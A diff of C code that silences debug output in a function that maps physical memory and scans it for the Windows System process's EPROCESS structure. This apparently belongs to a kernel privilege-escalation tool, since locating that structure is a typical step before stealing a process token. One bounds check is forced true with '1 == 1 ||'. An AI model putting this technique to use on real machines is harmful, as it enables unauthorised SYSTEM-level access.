@@ -259,7 +259,7 @@ unsigned __int64 GetEPROCESSPhysicalBaseOfSystem(HANDLE hPhysicalMemory) {
 					}
 					else
 					{
-						fprintf(stderr, "Struct does not fit into one page. Try mapping 4 pages.\n");
+						//fprintf(stderr, "Struct does not fit into one page. Try mapping 4 pages.\n");
 
 						if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page - 0x2000, 0x4000, fourPages) == FALSE) {
 							fprintf(stderr, "[!] MapPhysicalMemory failed\n");
@@ -272,7 +272,7 @@ unsigned __int64 GetEPROCESSPhysicalBaseOfSystem(HANDLE hPhysicalMemory) {
 						castedFourPages = (unsigned char*)castedFourPages + 0x2000;
 
 						// now castedFourPages and *buf point to the same memory
-						printf("\nFound pattern at: %p\n", (void*)(page + offset));
+						//printf("\nFound pattern at: %p\n", (void*)(page + offset));
 
 						// add pattern offset
 						castedFourPages = (unsigned char*)castedFourPages + offset;
@@ -282,7 +282,7 @@ unsigned __int64 GetEPROCESSPhysicalBaseOfSystem(HANDLE hPhysicalMemory) {
 						UniqueProcessId = EPROCESSBaseOfSystem + _EPROCESS_UniqueProcessId_offset;
 						if (1 == 1 || (unsigned __int64)castedFourPages <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)castedFourPages)
 						{
-							printf("Struct does fit into four pages.\n");
+							//printf("Struct does fit into four pages.\n");
 							if (*((unsigned __int64*)UniqueProcessId) == 0x4)
 							{
 								// PID of System is 4
@@ -294,7 +294,7 @@ unsigned __int64 GetEPROCESSPhysicalBaseOfSystem(HANDLE hPhysicalMemory) {
 						}
 						else
 						{
-							fprintf(stderr, "Struct does not fit into four page.\n");
+							//fprintf(stderr, "Struct does not fit into four page.\n");
 						}
 					}
 				}
